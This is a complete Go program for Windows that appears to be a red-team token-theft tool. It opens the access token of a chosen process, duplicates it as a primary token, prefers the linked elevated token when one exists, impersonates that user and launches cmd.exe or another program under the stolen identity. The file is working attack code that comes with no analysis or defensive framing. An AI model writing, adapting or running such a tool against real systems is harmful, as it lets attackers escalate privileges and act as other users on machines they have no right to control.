package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modadvapi32                 = syscall.NewLazyDLL("advapi32.dll")
	procImpersonateLoggedOnUser = modadvapi32.NewProc("ImpersonateLoggedOnUser")
	procGetUserNameW            = modadvapi32.NewProc("GetUserNameW")
)

func ImpersonateLoggedOnUser(token windows.Token) error {
	r1, _, e1 := syscall.SyscallN(procImpersonateLoggedOnUser.Addr(), uintptr(token), 0, 0)
	if r1 == 0 {
		return error(e1)
	}
	return nil
}

func GetUserName() (string, error) {
	var size uint32 = 256 // max username length
	var buffer = make([]uint16, size)

	r1, _, e1 := syscall.SyscallN(procGetUserNameW.Addr(), uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
	if r1 == 0 {
		return "", error(e1)
	}

	return windows.UTF16ToString(buffer), nil
}

func main() {

	application := flag.String("application", "cmd.exe", "Specify the application to execute")
	pid := flag.Int("pid", 0, "Specify the process ID")

	flag.Parse()

	// Validate arguments
	if *pid == 0 {
		fmt.Println("Error: -pid is is required")
		os.Exit(1)
	}

	tokenp, err := GetToken(int(*pid))
	if err != nil {
		fmt.Printf("[-] Error getting token for process %v: %v\n", pid, err)
		os.Exit(1)
	}

	err = ImpersonateLoggedOnUser(*tokenp)
	if err != nil {
		fmt.Printf("[-] Error impersonating user: %v\n", err)
		os.Exit(1)
	}

	currentUsername, err := GetUserName()
	if err != nil {
		fmt.Printf("[-] Error getting current username: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Current username: %v\n", currentUsername)

	err = execute(*application, tokenp)
	if err != nil {
		fmt.Printf("[-] Error executing process %v: %v\n", pid, err)
		os.Exit(1)
	}

}

func execute(application string, token *windows.Token) error {
	cmd := exec.Command(application)
	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(*token)}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Start()
	if err != nil {
		return err
	}

	cmd.Wait()
	return nil
}

func GetToken(pid int) (*windows.Token, error) {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(handle)

	var tokenProcess windows.Token
	if err = windows.OpenProcessToken(handle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, &tokenProcess); err != nil {
		return nil, err
	}

	var duplicatedToken windows.Token
	if err := windows.DuplicateTokenEx(tokenProcess, windows.MAXIMUM_ALLOWED, nil, windows.SecurityDelegation, windows.TokenPrimary, &duplicatedToken); err != nil {
		return nil, err
	}

	if !duplicatedToken.IsElevated() {
		linkedToken, err := duplicatedToken.GetLinkedToken()
		if err == nil {
			windows.CloseHandle(windows.Handle(duplicatedToken))
			duplicatedToken = linkedToken
		}
	}

	return &duplicatedToken, nil
}
